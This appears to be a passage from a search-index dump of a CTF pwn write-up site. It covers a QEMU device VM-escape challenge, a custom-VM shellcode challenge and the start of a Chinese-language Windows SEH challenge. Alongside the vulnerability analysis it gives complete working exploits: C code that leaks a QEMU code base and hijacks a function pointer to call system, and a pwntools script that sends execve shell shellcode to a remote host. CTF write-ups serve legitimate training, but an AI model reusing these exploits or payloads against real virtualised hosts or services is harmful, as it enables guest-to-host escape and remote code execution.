QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); }","title":"Analysis"},{"location":"pwn/VMEscape/BabyQemu/#vulnerability","text":"","title":"vulnerability"},{"location":"pwn/VMEscape/BabyQemu/#oob-write","text":"We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN.","title":"OOB Write"},{"location":"pwn/VMEscape/BabyQemu/#oob-write_1","text":"We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation.","title":"OOB WRITE"},{"location":"pwn/VMEscape/BabyQemu/#exploit","text":"#include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"exploit"},{"location":"pwn/VMEscape/scvm/","text":"scvm huwangbei2019 offline An easy VM challenge. Compared with the system-level virtual machine topic, this kind of topic can be understood as customizing a CPU instruction set, and realizing the emulator of the instruction set, not the virtualization at the hardware system level. Reverse VM Struct It is really easy to know the struct of VM by analyzing the function as follows. 00000000 vm_t struc ; (sizeof=0x20, mappedto_8) 00000000 reg_cnt dd ? 00000004 fun_cnt dd ? 00000008 regs dq ? 00000010 funs dq ? ; base 2 00000018 mem dq ? 00000020 vm_t ends 00000020 Instruction Type Instructions are four byte long and byte-aligned. [fun_id] [val1] [val2] [val3] fun_id is used to know which function should be called. For example, instruction add use 3 vals and do the operation regs[val1] = regs[val2] + regs[val3] . Functions 10 functions are supported, but function lea is not useful. exit: exit(0) add: regs[val1] = regs[val2] + regs[val3] sub: regs[val1] = regs[val2] - regs[val3] mul: regs[val1] = regs[val2] * regs[val3] div: regs[val1] = regs[val2] / regs[val3] mod: regs[val1] = regs[val2] % regs[val3] mov: regs[val1] = val2 print: print(reg[val3]) lea: regs[val1] = (uint32_t)(vm- mem + val2) mov2mem: *(byte *)(vm- mem + val2) = regs[val1] Vulnerability Incomplete Checking We can input 0x1000 bytes as vm- mem . However, the check will only check 0x800 bytes, so we can bypass this check if we input malicious instructions after 0x800 bytes. self-modifying code It is obvious that instruction mov2mem can modify *(byte *)(vm- mem + val2) to the value of regs[val1] . But it does not check the value of val2. So, we can modify the value of a bytes in memory (0 ~ 0xff) to the value we want, static check makes no sense. Exploit It is enough to use Incomplete Checking for exploiting. Firstly, we input enough bytes (more than 0x800 ) to bypass static checking. payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) Leak We cannot leak address of vm- mem by original print like operations, because we can only input once. So, we need to leak vm- mem to a reg of this vm and use the instructions integrated into this vm ( sub or add is great). We the vm is inited, heap chunk for regs and funcs are allocated and then the struct vm is allocated, too. We can use sub to get the value of regs[0~0xff] . So, leak is done. We can also use this trick to modify the value of funs[i] to the one we like. However, remember that the operand size is 32 bits , not 64 bits. The arch of this executable elf is amd64 . So, we need to modify the value of a function ptr twice (low 32 bits and high 32 bits). Shellcode It is easy that the memory allocated for vm is marked as rwx , so we just need to set rip to the address of our vm mem. EXP from pwn import * local=1 pc= ./scvm aslr=True context.log_level=True context.arch = amd64 context.word_size = 64 context.os = linux context.endian = little if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./libc.so.6 }) p = process(pc,aslr=aslr) gdb.attach(p) else: remote_addr=[ 172.16.9.45 , 17730] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def gen_print(i, j=0, k=0): s = s += chr(7) s += chr(i) s += chr(j) s += chr(k) return s def gen_mov(i, j, k = 0): s = s += chr(6) s += chr(i) s += chr(j) s += chr(k) return s def gen_sub(i, j, k): s = s += chr(2) s += chr(i) s += chr(j) s += chr(k) return s def gen_add(i, j, k): s = s += chr(1) s += chr(i) s += chr(j) s += chr(k) return s def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) if __name__ == __main__ : payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) payload+= gen_mov(0,0x80) payload+= gen_sub(2, 0x2e + 4, 2) payload+= gen_sub(3, 0x2f + 4, 3) for i in range(0, 0x12): payload+= gen_add(2, 0, 2) payload+= gen_sub(0x22, 0x22, 0x22) payload+= gen_sub(0x23, 0x23, 0x23) payload+= gen_sub(0x22, 0x2, 0x22) payload+= gen_sub(0x23, 0x3, 0x23) payload+= gen_print(0x10) payload = payload.ljust(0x900, \\x00 ) buf = buf += \\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73 buf += \\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89 buf += \\xe6\\xb0\\x3b\\x0f\\x05 payload+= buf #payload = payload.ljust(0xa0, \\x00 ) #payload+= p32( 0x11DA - 0x10A0) sn(payload) p.interactive()","title":"scvm"},{"location":"pwn/VMEscape/scvm/#scvm","text":"huwangbei2019 offline An easy VM challenge. Compared with the system-level virtual machine topic, this kind of topic can be understood as customizing a CPU instruction set, and realizing the emulator of the instruction set, not the virtualization at the hardware system level.","title":"scvm"},{"location":"pwn/VMEscape/scvm/#reverse","text":"","title":"Reverse"},{"location":"pwn/VMEscape/scvm/#vm-struct","text":"It is really easy to know the struct of VM by analyzing the function as follows. 00000000 vm_t struc ; (sizeof=0x20, mappedto_8) 00000000 reg_cnt dd ? 00000004 fun_cnt dd ? 00000008 regs dq ? 00000010 funs dq ? ; base 2 00000018 mem dq ? 00000020 vm_t ends 00000020","title":"VM Struct"},{"location":"pwn/VMEscape/scvm/#instruction-type","text":"Instructions are four byte long and byte-aligned. [fun_id] [val1] [val2] [val3] fun_id is used to know which function should be called. For example, instruction add use 3 vals and do the operation regs[val1] = regs[val2] + regs[val3] .","title":"Instruction Type"},{"location":"pwn/VMEscape/scvm/#functions","text":"10 functions are supported, but function lea is not useful. exit: exit(0) add: regs[val1] = regs[val2] + regs[val3] sub: regs[val1] = regs[val2] - regs[val3] mul: regs[val1] = regs[val2] * regs[val3] div: regs[val1] = regs[val2] / regs[val3] mod: regs[val1] = regs[val2] % regs[val3] mov: regs[val1] = val2 print: print(reg[val3]) lea: regs[val1] = (uint32_t)(vm- mem + val2) mov2mem: *(byte *)(vm- mem + val2) = regs[val1]","title":"Functions"},{"location":"pwn/VMEscape/scvm/#vulnerability","text":"","title":"Vulnerability"},{"location":"pwn/VMEscape/scvm/#incomplete-checking","text":"We can input 0x1000 bytes as vm- mem . However, the check will only check 0x800 bytes, so we can bypass this check if we input malicious instructions after 0x800 bytes.","title":"Incomplete Checking"},{"location":"pwn/VMEscape/scvm/#self-modifying-code","text":"It is obvious that instruction mov2mem can modify *(byte *)(vm- mem + val2) to the value of regs[val1] . But it does not check the value of val2. So, we can modify the value of a bytes in memory (0 ~ 0xff) to the value we want, static check makes no sense.","title":"self-modifying code"},{"location":"pwn/VMEscape/scvm/#exploit","text":"It is enough to use Incomplete Checking for exploiting. Firstly, we input enough bytes (more than 0x800 ) to bypass static checking. payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4)","title":"Exploit"},{"location":"pwn/VMEscape/scvm/#leak","text":"We cannot leak address of vm- mem by original print like operations, because we can only input once. So, we need to leak vm- mem to a reg of this vm and use the instructions integrated into this vm ( sub or add is great). We the vm is inited, heap chunk for regs and funcs are allocated and then the struct vm is allocated, too. We can use sub to get the value of regs[0~0xff] . So, leak is done. We can also use this trick to modify the value of funs[i] to the one we like. However, remember that the operand size is 32 bits , not 64 bits. The arch of this executable elf is amd64 . So, we need to modify the value of a function ptr twice (low 32 bits and high 32 bits).","title":"Leak"},{"location":"pwn/VMEscape/scvm/#shellcode","text":"It is easy that the memory allocated for vm is marked as rwx , so we just need to set rip to the address of our vm mem.","title":"Shellcode"},{"location":"pwn/VMEscape/scvm/#exp","text":"from pwn import * local=1 pc= ./scvm aslr=True context.log_level=True context.arch = amd64 context.word_size = 64 context.os = linux context.endian = little if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./libc.so.6 }) p = process(pc,aslr=aslr) gdb.attach(p) else: remote_addr=[ 172.16.9.45 , 17730] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def gen_print(i, j=0, k=0): s = s += chr(7) s += chr(i) s += chr(j) s += chr(k) return s def gen_mov(i, j, k = 0): s = s += chr(6) s += chr(i) s += chr(j) s += chr(k) return s def gen_sub(i, j, k): s = s += chr(2) s += chr(i) s += chr(j) s += chr(k) return s def gen_add(i, j, k): s = s += chr(1) s += chr(i) s += chr(j) s += chr(k) return s def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) if __name__ == __main__ : payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) payload+= gen_mov(0,0x80) payload+= gen_sub(2, 0x2e + 4, 2) payload+= gen_sub(3, 0x2f + 4, 3) for i in range(0, 0x12): payload+= gen_add(2, 0, 2) payload+= gen_sub(0x22, 0x22, 0x22) payload+= gen_sub(0x23, 0x23, 0x23) payload+= gen_sub(0x22, 0x2, 0x22) payload+= gen_sub(0x23, 0x3, 0x23) payload+= gen_print(0x10) payload = payload.ljust(0x900, \\x00 ) buf = buf += \\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73 buf += \\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89 buf += \\xe6\\xb0\\x3b\\x0f\\x05 payload+= buf #payload = payload.ljust(0xa0, \\x00 ) #payload+= p32( 0x11DA - 0x10A0) sn(payload) p.interactive()","title":"EXP"},{"location":"pwn/Windows/BabyStack/","text":"Baby Stack SUCTF 2019 Windows SEH windows\u4e0b\u901a\u8fc7SEH\u673a\u5236\u5904\u7406\u5f02\u5e38\u3002\u5728\u8fdb\u7a0b\u8fd0\u884c\u53d1\u751f\u5f02\u5e38\u65f6\uff0cwindows\u59d4\u6258\u8fdb\u7a0b\u8fdb\u884c\u5904\u7406\u3002\u82e5\u7a0b\u5e8f\u4e2d\u6709\u9884\u5148\u6784\u9020\u7684\u5f02\u5e38\u5904\u7406\u94fe(SEH\u94fe)\uff0c\u5219\u7a0b\u5e8f\u4f1a\u6839\u636eSEH\u94fe\u5904\u7406\u5f02\u5e38\uff0c\u5e76\u6309\u7167\u6307\u793a\u7ee7\u7eed\u6267\u884c\uff1b\u82e5\u7a0b\u5e8f\u4e2d\u65e0SEH\u94fe\uff0c\u5219\u7cfb\u7edf\u4f1a\u8c03\u7528\u9ed8\u8ba4\u7684SEH\u94fe\u5904\u7406\u5f02\u5e38\uff0c\u5e76\u5c06\u7a0b\u5e8f\u7ec8\u6b62\u3002 SEH\u94fe\u4e3a\u5355\u94fe\u8868\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u5728\u4e24\u4e2a\u5143\u7d20\uff1a1\u3001\u6307\u5411\u4e0b\u4e00\u4e2aSEH\u5757\u7684\u6307\u9488\uff1b2\u3001\u5f02\u5e38\u5904\u7406\u51fd\u6570\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u89e6\u53d1\u5f02\u5e38\u5904\u7406\u65f6\uff0c\u4f1a\u4eceSEH\u7684\u7b2c\u4e00\u4e2a\u5757\u5f00\u59cb\u904d\u5386\uff0c\u82e5\u7b2c\u4e00\u4e2a\u5757\u672a\u80fd\u5904\u7406\u5f02\u5e38\u65f6\uff0c\u4fbf\u5c06\u5f02\u5e38\u4f20\u9012\u81f3\u4e0b\u4e00\u4e2a\u5757\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u5230\u5f02\u5e38\u88ab\u5904\u7406\u6216\u904d\u5386\u5b8c\u6240\u6709\u7684SEH\u5757\u3002 \u901a\u8fc7Windbg\u83b7\u53d6teb\u4e4b\u540e\uff0c\u53ef\u4eceteb\u8868\u5730\u5740\u83b7\u53d6SEH\u94fe\u5730\u5740\uff0c\u4ece\u800c\u904d\u5386SEH\u94fe\uff0c\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230SEH\u5757\u4e2d\u7684\u7ed3\u6784\u3002 0:000 !teb Wow64 TEB32 at 00000000009b1000 ...... 0:000 dt ntdll!_EXCEPTION_REGISTRATION_RECORD -l next poi(9b1000) next at 0x00000000`009b3000 --------------------------------------------- +0x000 Next : 0x00b00000`ffffffff _EXCEPTION_REGISTRATION_RECORD +0x008 Handler : 0x00000000`00aff000 _EXCEPTION_DISPOSITION +aff000 next at 0x00b00000`ffffffff --------------------------------------------- +0x000 Next : ???? +0x008 Handler : ???? Memory read error 00b0000100000007 \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5e38\u89c1\u7684\u5f02\u5e38\u5982\u4e0b\uff1a windows-SEH\u8be6\u89e3 \u770b\u96ea\u8bba\u575b https://bbs.pediy.com/thread-249592.htm \u5206\u6790\u8c03\u8bd5 \u9898\u76ee\u521d\u59cb\u65f6\u5373\u544a\u8bc9\u4e86\u6808\u7684\u5730\u5740\u548cmain\u51fd\u6570\u7684\u5730\u5740\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u7ed9\u7684\u5730\u5740\u662f\u5b58\u50a8main\u51fd\u6570\u5730\u5740\u7684\u503c\u7684\u5730\u5740\uff0c\u5373\u6307\u5411main\u51fd\u6570\u7684\u6307\u9488\u7684\u5730\u5740\u3002 \u4e0e\u9898\u76ee\u4ea4\u4e92\u7684\u552f\u4e00\u65b9\u5f0f\u5c31\u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u901a\u8fc7\u9759\u6001\u5206\u6790\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u5b58\u5728\u6808\u4e0a\uff0c\u800c\u7ecf\u8fc7strlen\u5224\u65ad\u5b57\u7b26\u4e32\u957f\u5ea6\u4e4b\u540e\uff0c\u8fdb\u884c\u4e86\u67d0\u4e9b\u8fd0\u7b97\uff0c\u7136\u540e\u8c03\u7528\u8f93\u51fa\u5b57\u7b26\u4e32\u7684\u51fd\u6570\uff0c\u800c\u540e\u9000\u51fa\u3002\u800c\u8f93\u5165\u91c7\u7528\u7684\u662f\u63a7\u5236\u8f93\u5165\u4e2a\u6570\u7684scanf_s\u4e00\u7c7b\u51fd\u6570\uff0c\u56e0\u6b64\u6808\u6ea2\u51fa\u7684\u53ef\u80fd\u6027\u8f83\u5c0f\u3002 \u56e0\u6b64\uff0c\u8003\u8651\u901a\u8fc7\u8986\u76d6SEH\u540e\uff0c\u89e6\u53d1\u5f02\u5e38\uff0c\u8df3\u5230\u4f2a\u9020\u7684SEH\u4e2d\u3002\u800c\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e38\u89c1\u5f02\u5e38\uff0c\u5224\u65ad\u53ef\u80fd\u5728\u672c\u7a0b\u5e8f\u4e2d\u89e6\u53d1\u7684\u5f02\u5e38\u6709\uff1a\u6d6e\u70b9\u6570\u6ea2\u51fa\u3001\u8bfb\u5199\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\u6216\u9664\u6570\u4e3a0. \u9996\u5148\u6392\u9664\u6700\u5bb9\u6613\u7684\uff0c\u9664\u6570\u4e3a0\u3002\u5224\u65ad\u9664\u6570\u4e3a0\u7684\u65b9\u5f0f\u662f\u5148\u627e\u5230\u662f\u5426\u5b58\u5728\u9664\u6cd5\uff0c\u53ea\u8981\u5b58\u5728\u9664\u6cd5\uff0c\u5c31\u6709\u9664\u6570\u4e3a0\u7684\u53ef\u80fd\u3002\u901a\u8fc7\u5b57\u7b26\u4e32\u641c\u7d22\uff0c\u5728\u6c47\u7f16\u6307\u4ee4\u4e2d\u641c\u7d22\u201cdiv\u201d\u6307\u4ee4\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728\u9664\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22\u7ed3\u679c\u53ef\u4ee5\u770b\u5230\uff0c\u5b58\u5728\u5927\u91cf\u7684\u9664\u6cd5\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6784\u9020\u96640\u5bfc\u81f4SEH\u3002 \u4ece\u7b2c\u4e00\u4e2a\u770b\u8d77\uff0c\u5728main\u51fd\u6570\u4e2d\u6709\u4e00\u6b21div\u64cd\u4f5c\uff0c\u5728\u8fd0\u7b97\u4e4b\u540e\uff0c\u8f93\u51fa\u5b57\u7b26\u4e32\u4e4b\u524d\u3002 \u800c\u9664\u6570[esi]\u662f\u901a\u8fc7\u8fd0\u7b97 $$ [esi] - [eax] $$ \u5f97\u5230\u7684\uff0c\u800c[esi]\u53c8\u662f\u6808\u4e0a\u7684\u503c\u4f20\u9012\u8fdb\u6765esi\u5f97\u5230\u7684\uff0c\u800c\u8be5\u503c\u53c8\u662f\u901a\u8fc7main\u51fd\u6570\u4e2d\u7684\u8ba1\u7b97\u8fc7\u7a0b\u5f97\u5230\u7684\uff1a \u56e0\u6b64\u6211\u4eec\u5982\u679c\u80fd\u6784\u9020\u51fa\u5408\u9002\u7684v30\uff0c\u4f7f\u4e4b\u4e0eeax\u76f8\u7b49\uff0c\u5219\u53ef\u4ee5\u4f7f\u9664\u6570\u4e3a0\uff0c\u89e6\u53d1SEH\u3002 \u901a\u8fc7\u52a8\u6001\u8c03\u8bd5\uff0c\u53ef\u4ee5\u770b\u5230eax\u7684\u503c\u3002\u591a\u6b21\u8c03\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u65e0\u8bba\u8f93\u5165\u5982\u4f55\u6539\u53d8\uff0c\u6700\u7ec8eax\u7684\u503c\u662f\u4ece\u6808\u4e2dpop\u51fa\u6765\u7684\uff0c\u53ea\u4e0e\u6307\u5411main\u51fd\u6570\u6307\u9488\u7684\u5730\u5740\u6210\u56fa\u5b9a\u504f\u79fb\uff0c\u4e3a4BF3\u3002\u56e0\u6b64\uff1a $$ [eax] = MAINaddress + 4BF3 $$ \u800c\u901a\u8fc7\u8fd0\u7b97\u90e8\u5206\u53cd\u63a8\u5982\u4e0b\uff1a\u5148\u9006\u51fa\u8fd0\u7b97\u90e8\u5206\u7684\u4ee3\u7801\uff0c\u5e76\u7b80\u5316\uff0c\u5982\u4e0b\uff1a int v7 = 0 ; int v30 = 0 ; for ( v22 = 0 ; v22 8 ; v22 ++ ) { char v23 = v31 [ v22 ]; //v31\u4e3a\u8f93\u5165\u5b57\u7b26\u4e32 if ( v23 - 0 9 ) //\u5224\u65ad\u5b57\u7b26\u5982\u679c\u4e0d\u4e3a\u6570\u5b57 { if ( v23 - A = 5 ) //\u5982\u679c\u4e3a\u5927\u5199\u7684A~F { v7 = v23 + 0x10 * v7 - 0x37 ; v30 = v7 ; } } else //\u6570\u5b57\u6216\u8005ASCII\u5c0f\u4e8e\u6570\u5b57\u7684\u5b57\u7b26 { v7 = v23 + 0x10 * ( v7 - 0x3 ); v30 = v7 ; } } 